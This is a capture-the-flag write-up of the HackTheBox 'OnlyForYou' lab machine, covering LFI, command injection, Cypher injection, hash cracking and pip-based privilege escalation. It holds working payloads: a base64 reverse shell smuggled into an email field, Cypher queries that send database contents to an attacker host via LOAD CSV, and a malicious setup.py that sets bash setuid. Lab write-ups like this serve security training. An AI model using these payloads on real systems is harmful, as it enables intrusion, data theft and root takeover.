---
title: HackTheBox | OnlyForYou
date: 2023-04-26
description: OnlyForYou is a Medium-difficulty Linux machine.
published: true
categories:
  - CTF
  - HackTheBox
tags:
  - HackTheBox
  - linux
  - web
  - flask
  - lfi
  - path-normalization
  - command-injection
  - spf
  - neo4j
  - cypher-injection
  - hash-cracking
  - gogs
  - pip
  - malicious-package
  - privilege-escalation
image:
  path: /assets/only.jpg
---

## OnlyForYou - Linux

**Difficulty:** Medium
**OS:** Linux

## Enumeration

A standard nmap sweep turned up just two open ports, SSH and a web server redirecting to a hostname.

```shell
nmap -sC -sV 10.10.11.x

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
```

Added `only4you.htb` to my hosts file and started poking at the site.

## Path Traversal in the download Endpoint

The main site has a file listing feature with a `/download` endpoint that accepts a POST body containing an `image` field. Naturally the first thing to try is whether that field can be pointed somewhere it shouldn't.

It turns out an absolute path works, and it works because of a subtle quirk in how Python joins paths. Here's a tiny proof that the endpoint's own logic is vulnerable, mirroring what the server actually does internally.

```shell
python3 -c "
import os
filename = '/etc/passwd'
filename = os.path.join('/tmp/test/uploads/list', filename)
print(filename)
"

/etc/passwd
```

`os.path.join()` completely discards everything before an argument that starts with a leading slash. So even though the application prepends its own upload folder to whatever filename you give it, feeding it an absolute path just overrides that entirely, and you end up reading straight off the filesystem. The app does block `..` sequences to stop classic traversal, but it never stops you from just supplying a full path in the first place, so that filter doesn't matter.

I wrapped this into a small helper script so I didn't have to hand craft curl requests for every file.

```shell
cat read.py

#!/usr/bin/python3
import os, sys

def read(filename):
    cmd = "curl -s -i -k -X 'POST' -H 'Host: beta.only4you.htb' -H 'Content-Type: application/x-www-form-urlencoded' --data-binary 'image=" + filename + "' 'http://beta.only4you.htb/download'"
    return os.popen(cmd).read()

filename = sys.argv[1]
print(read(filename))
```

```shell
python3 read.py /etc/nginx/sites-enabled/default
```

## Leaking the Application Source

Reading nginx's site config told me exactly where the web applications live on disk. There are actually two separate Flask apps behind this single nginx instance, one for `only4you.htb` and one for `beta.only4you.htb`, each proxied to its own unix socket.

```shell
server {
    listen 80;
    server_name only4you.htb;
    location / {
        include proxy_params;
        proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
    }
}
server {
    listen 80;
    server_name beta.only4you.htb;
    location / {
        include proxy_params;
        proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
    }
}
```

With those paths in hand I pulled the actual application source straight through the same LFI.

```shell
python3 read.py /var/www/only4you.htb/app.py
```

Near the top of `app.py` was an import that pointed at another file worth reading.

```shell
from form import sendmessage
```

```shell
python3 read.py /var/www/only4you.htb/form.py
```

## Command Injection via an Unvalidated SPF Lookup

Inside `form.py` sat a function meant to validate that a submitted email address has a legitimate SPF record before letting a contact form message through. On the surface this sounds like a sane anti-spam check. In practice it builds a shell command directly out of the domain portion of whatever email address the user submits, with no sanitization at all.

```shell
def issecure(email, ip):
    if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
        return 0
    else:
        domain = email.split("@", 1)[1]
        result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
        output = result.stdout.decode('utf-8')
        if "v=spf1" not in output:
            return 1
        ...
```

The regex only checks that the string looks roughly like an email address, it never restricts what characters can appear after the `@`. Since `domain` gets dropped straight into a shell string with `shell=True`, anything after the domain that looks like a shell metacharacter just runs.

I built a payload that smuggles a base64 encoded reverse shell in behind a semicolon, so it executes as a second command right after the legitimate `dig` lookup.

```shell
name=test&email=test%40example.de; echo YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDIvMTIzNCAwPiYxJw== | base64 -d | bash  #&subject=test&message=test
```

The response itself just came back with a generic flash message.

```shell
{"_flashes":[{" t":["danger","You are not authorized!"]}]}
```

But the command had already fired on the backend, and a listener caught the callback.

```shell
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell as `www-data`.

## Lateral Movement to a Second App

Checking local listening ports from inside the shell showed something bound only to localhost.

```shell
netstat -tulpn | grep 127.0.0.1

tcp   127.0.0.1:8001   LISTEN
```

Port 8001 wasn't reachable from outside, but from `www-data`'s position I could reach it directly.

- [http://127.0.0.1:8001/login](http://127.0.0.1:8001/login)

Default credentials got me straight in.

```shell
admin : admin
```

The app has a search feature, and throwing a single quote at it triggered a 500 error rather than the graceful failure you'd expect from a normal parameterized query. That's a strong signal of an injection point, but treating it like plain SQL didn't get anywhere.

## Cypher Injection Against Neo4j

The clue turned out to be the error behavior itself. This app isn't backed by MySQL or Postgres, it's backed by Neo4j, a graph database that uses its own query language called Cypher instead of SQL. Once I stopped trying SQL syntax and started thinking in Cypher, the injection opened right up.

Confirming the injection with a simple always true condition.

```shell
search=a' AND 1=1 AND 'A'='A
```

From there, Cypher supports a neat trick for blind exfiltration, you can make the database itself issue an outbound HTTP request via `LOAD CSV FROM`, encoding whatever data you want into the URL as query parameters, and just watch your own webserver logs for the callback.

Reading the database version this way.

```shell
' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.42/?version='+ version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```

Enumerating node labels the same way.

```shell
' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.42/?label='+label as l RETURN 0 as _0 //
```

That returned two labels worth digging into, `user` and `employee`. Pulling every property off the `user` nodes.

```shell
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.42/?'+ p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

That leaked two password hashes straight out of the graph.

```shell
admin : 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
john  : a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
```

## Cracking the Hash

Both looked like SHA256, so I threw john's hash at rockyou.

```shell
hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt

...
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:ThisIs4You
```

Cracked. `john : ThisIs4You`.

## user.txt

That password worked for SSH directly as the real system user `john`, and the user flag was waiting there.

## Privilege Escalation via pip3 download

`sudo -l` as `john` showed a very specific, very narrow looking allowance.

```shell
sudo -l

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

At first glance `pip3 download` looks harmless, it's meant to just fetch a package archive without installing it. The catch is that `pip download` still evaluates the package's `setup.py` as part of resolving its metadata, egg-info generation specifically runs arbitrary code even when you never actually install anything. That's a well documented pip behavior, not a bug unique to this box, and it means any tarball we can get pip to "download" from that internal Gogs server effectively becomes remote code execution as root.

- [Malicious Python Packages and Code Execution via pip download](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)

Port 3000 turned out to be a local Gogs instance, a self hosted Git service, reachable with the same `john` / `ThisIs4You` credentials. I created a repo, dropped in a malicious `setup.py` that hooks both the install and egg_info commands to run arbitrary code the moment pip touches the package.

```shell
cat setup.py

from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

def RunCommand():
    import os
    os.popen("chmod u+s /bin/bash").read()

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)

class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "this_is_fine_wuzzi",
    version = "0.0.1",
    license = "MIT",
    packages = find_packages(),
    cmdclass = {
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```

Made sure the repo was public so pip could actually fetch it, then triggered the sudo rule against Gogs' auto generated tarball archive link for that repo.

```shell
sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/archive/master.tar.gz
```

The egg_info hook fires as root the instant pip inspects the package, and the setuid bit lands on bash.

## root.txt

```shell
/bin/bash -p
bash-5.0# whoami
root
```

Root shell, flag retrieved.
